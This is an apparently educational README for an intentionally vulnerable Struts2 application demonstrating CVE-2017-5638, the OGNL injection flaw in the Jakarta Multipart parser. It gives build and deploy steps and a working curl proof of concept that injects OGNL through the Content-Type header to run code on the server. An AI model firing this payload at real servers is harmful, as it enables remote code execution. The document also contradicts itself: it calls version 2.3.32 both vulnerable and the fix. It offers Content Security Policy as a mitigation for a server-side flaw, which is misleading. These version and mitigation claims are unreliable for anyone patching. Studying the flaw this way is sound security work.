# Struts2 Vulnerable Application - CVE-2017-5638

## Overview
This project demonstrates the Apache Struts2 vulnerability CVE-2017-5638, which allows remote code execution (RCE) via crafted Content-Type headers during file upload requests. The vulnerability exists in the Jakarta Multipart parser used by Struts2.

## Vulnerability Details
- **CVE ID**: CVE-2017-5638
- **Description**: The vulnerability is caused by improper handling of Content-Type headers in file upload requests. An attacker can exploit this by sending a malicious Content-Type header containing OGNL (Object-Graph Navigation Language) expressions, which are evaluated on the server, leading to arbitrary code execution.
- **Affected Versions**: Struts 2.3.5 to 2.3.31 and 2.5 to 2.5.10.

## Demonstration
This application is configured with Struts2 version 2.3.32, which is vulnerable to CVE-2017-5638. The following steps demonstrate the vulnerability:

1. **Setup**:
   - Build the application using Maven: `mvn clean package`.
   - Deploy the generated WAR file to a servlet container (e.g., Apache Tomcat).

2. **File Upload Feature**:
   - Access the file upload form at `http://<server>:<port>/S2-045/index.jsp`.
   - Upload a file to test the functionality.

3. **Exploit**:
   - Use a tool like `curl` or a custom script to send a malicious request:
     ```bash
     curl -v -X POST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Exploit-Executed')}.multipart/form-data" \
     -F "upload=@test.txt" \
     http://<server>:<port>/S2-045/fileUpload.action
     ```
   - Observe the response headers for the custom header `X-Test: Exploit-Executed`, indicating successful code execution.

## Mitigation
To protect against this vulnerability:
- Upgrade to Struts2 version 2.3.32 or later.
- Use a Content Security Policy (CSP) to restrict header injection.
- Validate and sanitize all user inputs.

## Disclaimer
This project is for educational purposes only. Do not use it in production environments or for malicious purposes.